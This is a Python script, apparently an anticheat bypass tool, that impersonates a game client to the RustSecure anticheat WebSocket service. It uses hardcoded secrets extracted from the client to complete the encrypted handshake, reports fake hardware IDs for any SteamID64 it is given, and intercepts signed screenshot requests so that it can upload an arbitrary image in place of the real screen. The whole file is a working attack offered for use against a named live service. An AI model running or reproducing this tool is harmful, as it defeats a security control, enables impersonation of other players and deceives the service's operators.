#!/usr/bin/env python3
"""
RustSecure fake WebSocket client — connects to the anticheat server
without the game, intercepts screenshot requests and replays signatures.

Implements the full ECDH v3 handshake + ChaCha20-Poly1305 session encryption.

Usage:
  pip install websockets cryptography
  python3 ws_fake_client.py <steamid64> [--upload trollface.png]

Flow:
  1. Connect to wss://rustsecure.ru/ws
  2. ECDH v3 handshake (X25519 + HMAC-SHA256)
  3. Send PlayerConnected with fake HWIDs
  4. Listen for server commands
  5. On RequestScreenshotV2 → capture signature → upload arbitrary image
"""

import asyncio, json, base64, hashlib, hmac, time, struct, sys, os, argparse

try:
    import websockets
    from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
    from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
except ImportError:
    print("pip install websockets cryptography")
    sys.exit(1)

try:
    import requests
except ImportError:
    requests = None

# ============================================================
#  Constants from decrypted strings
# ============================================================
WS_URL = "wss://rustsecure.ru/ws"
UPLOAD_URL = "https://rustsecure.ru/api/ingest/screenshot"
MASTER_SECRET = b"RSv1.HoNrj7uosYTypvYR58Zq4YJ3d5RtI8AqtnnjB6qG5YfH3WY9dpNE1Hx1hbv"
LOADER_SECRET = "R260iT7ujsI58aTxAExVby6qea3L056h6SfnEr2BLKbmY2vlvm"


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

def hmac_sha256(key: bytes, data: bytes) -> bytes:
    return hmac.new(key, data, hashlib.sha256).digest()

def hkdf_expand(prk: bytes, info: bytes, length: int = 32) -> bytes:
    """HKDF-Expand (RFC 5869) with SHA-256."""
    hash_len = 32
    n = (length + hash_len - 1) // hash_len
    okm = b""
    t = b""
    for i in range(1, n + 1):
        t = hmac_sha256(prk, t + info + bytes([i]))
        okm += t
    return okm[:length]


class RustSecureSession:
    def __init__(self):
        self.enc_key = b""
        self.session_id = ""
        self.send_seq = 0
        self.recv_seq = 0

    def protect(self, plaintext: str) -> str:
        """Encrypt a message with ChaCha20-Poly1305."""
        self.send_seq += 1
        aad = f"{self.session_id}|{self.send_seq}|{self.recv_seq}".encode()

        # Nonce: 12 bytes derived from send_seq
        nonce = struct.pack("<Q", self.send_seq).ljust(12, b"\x00")

        cipher = ChaCha20Poly1305(self.enc_key)
        ct = cipher.encrypt(nonce, plaintext.encode(), aad)
        return b64url_encode(ct)

    def unprotect(self, envelope: str) -> str:
        """Decrypt a message with ChaCha20-Poly1305."""
        ct = b64url_decode(envelope)

        # Try incrementing recv_seq to find the right counter
        # Server may have sent multiple messages
        for delta in range(1, 100):
            try_seq = self.recv_seq + delta
            aad = f"{self.session_id}|{try_seq}|{self.send_seq}".encode()
            nonce = struct.pack("<Q", try_seq).ljust(12, b"\x00")
            cipher = ChaCha20Poly1305(self.enc_key)
            try:
                pt = cipher.decrypt(nonce, ct, aad)
                self.recv_seq = try_seq
                return pt.decode()
            except Exception:
                continue
        raise ValueError("Failed to decrypt message")


async def do_handshake(ws) -> RustSecureSession:
    """Perform ECDH v3 handshake."""
    # Generate ephemeral X25519 keypair
    private_key = X25519PrivateKey.generate()
    public_key = private_key.public_key()
    pub_bytes = public_key.public_bytes_raw()
    pub_b64 = b64url_encode(pub_bytes)

    # Generate nonce
    nonce = os.urandom(16)
    nonce_b64 = b64url_encode(nonce)

    # Timestamp
    ts = int(time.time())
    ts_str = str(ts)

    # Compute signature
    sig_data = f"client-hello|{pub_b64}|{nonce_b64}|{ts_str}".encode()
    sig = b64url_encode(hmac_sha256(MASTER_SECRET, sig_data))

    # Send ClientHello
    hello = json.dumps({
        "type": "ClientHello",
        "pub": pub_b64,
        "nonce": nonce_b64,
        "ts": ts,
        "sig": sig
    })
    print(f"[>] ClientHello (pub={pub_b64[:20]}...)")
    await ws.send(hello)

    # Receive ServerHello
    response = await asyncio.wait_for(ws.recv(), timeout=10)
    server_hello = json.loads(response)
    print(f"[<] ServerHello (type={server_hello.get('type')})")

    if server_hello.get("type") != "ServerHello":
        raise ValueError(f"Expected ServerHello, got: {server_hello.get('type')}")

    server_pub_b64 = server_hello["pub"]
    server_nonce_b64 = server_hello["nonce"]
    server_ts = server_hello["ts"]
    server_sig = server_hello["sig"]

    # Verify server signature
    verify_data = f"server-hello|{server_pub_b64}|{server_nonce_b64}|{str(server_ts)}".encode()
    expected_sig = b64url_encode(hmac_sha256(MASTER_SECRET, verify_data))
    if not hmac.compare_digest(server_sig, expected_sig):
        raise ValueError("Server handshake signature mismatch")
    print("[+] Server signature verified")

    # ECDH shared secret
    server_pub_bytes = b64url_decode(server_pub_b64)
    server_pub_key = X25519PublicKey.from_public_bytes(server_pub_bytes)
    shared_secret = private_key.exchange(server_pub_key)

    # Derive session keys via HKDF-Expand
    # PRK = HMAC-SHA256(client_nonce + server_nonce, shared_secret)
    salt = nonce + b64url_decode(server_nonce_b64)
    prk = hmac_sha256(salt, shared_secret)

    session = RustSecureSession()
    session.enc_key = hkdf_expand(prk, b"rs-v3-enc", 32)
    session.session_id = b64url_encode(hkdf_expand(prk, b"rs-v3-sid", 16))

    print(f"[+] Session established (id={session.session_id[:16]}...)")
    return session


def build_player_connected(steam_id: str) -> str:
    """Build PlayerConnected JSON message."""
    fake_hwids = {
        "hwid_machine_guid": hashlib.sha256(b"fake_guid").hexdigest(),
        "hwid_volume_serial": hashlib.sha256(b"fake_vol").hexdigest(),
        "hwid_mac_address": hashlib.sha256(b"fake_mac").hexdigest(),
    }
    return json.dumps({
        "type": "PlayerConnected",
        "steamId": steam_id,
        "playerName": "Player",
        "hwids": fake_hwids
    })


def upload_screenshot(steam_id, request_id, sig, image_path=None):
    """Upload a screenshot using the captured signature."""
    if not requests:
        print("[!] requests library not installed, can't upload")
        return

    if image_path and os.path.exists(image_path):
        png_data = open(image_path, "rb").read()
    else:
        # Minimal red PNG
        png_data = b"\x89PNG\r\n\x1a\n" + b"\x00" * 200

    url = f"{UPLOAD_URL}?method=dxgi&width=1920&height=1080&affinity=0"
    headers = {
        "X-RS-SteamId": steam_id,
        "X-RS-RequestId": request_id,
        "X-RS-RequestSig": sig,
        "Content-Type": "application/octet-stream",
    }

    resp = requests.post(url, data=png_data, headers=headers, timeout=10)
    print(f"[UPLOAD] {resp.status_code} {resp.text[:100]}")
    return resp.status_code < 400


async def run(steam_id: str, image_path: str = None):
    print(f"[*] Connecting to {WS_URL}")
    print(f"[*] SteamID: {steam_id}")

    async with websockets.connect(WS_URL) as ws:
        # Step 1: ECDH handshake
        session = await do_handshake(ws)

        # Step 2: Send PlayerConnected
        msg = build_player_connected(steam_id)
        encrypted = session.protect(msg)
        await ws.send(encrypted)
        print(f"[>] PlayerConnected sent")

        # Step 3: Listen for commands
        print(f"[*] Listening for server commands... (Ctrl+C to stop)")
        while True:
            try:
                raw = await asyncio.wait_for(ws.recv(), timeout=120)

                try:
                    # Try to decrypt
                    command = session.unprotect(raw)
                    print(f"[<] Command: {command[:200]}")

                    # Check for screenshot request
                    if "RequestScreenshotV2" in command:
                        parts = command.split("|")
                        # Format: RequestScreenshotV2|requestId|issued|expires|reason|sig|method
                        if len(parts) >= 6:
                            req_id = parts[1]
                            sig = parts[5]
                            print(f"\n[!!!] SCREENSHOT REQUEST INTERCEPTED")
                            print(f"  RequestId: {req_id}")
                            print(f"  Signature: {sig}")
                            print(f"  Uploading fake screenshot...")
                            upload_screenshot(steam_id, req_id, sig, image_path)

                    elif "RequestScreenshot" in command and "V2" not in command:
                        print(f"\n[!] Simple screenshot request (v1, no signature)")

                    elif "BanPlayer" in command:
                        print(f"\n[!!!] BAN RECEIVED: {command}")

                except ValueError:
                    # Not encrypted or decryption failed
                    print(f"[<] Raw: {raw[:100]}")

            except asyncio.TimeoutError:
                # Send heartbeat
                hb = json.dumps({"type": "Heartbeat", "steamId": steam_id})
                encrypted = session.protect(hb)
                await ws.send(encrypted)
                print(f"[>] Heartbeat")

            except websockets.ConnectionClosed:
                print("[!] Connection closed")
                break


def main():
    parser = argparse.ArgumentParser(description="RustSecure fake WebSocket client")
    parser.add_argument("steamid", help="SteamID64 to impersonate")
    parser.add_argument("--upload", help="Image to upload when screenshot requested")
    args = parser.parse_args()

    try:
        asyncio.run(run(args.steamid, args.upload))
    except KeyboardInterrupt:
        print("\n[*] Stopped")


if __name__ == "__main__":
    main()
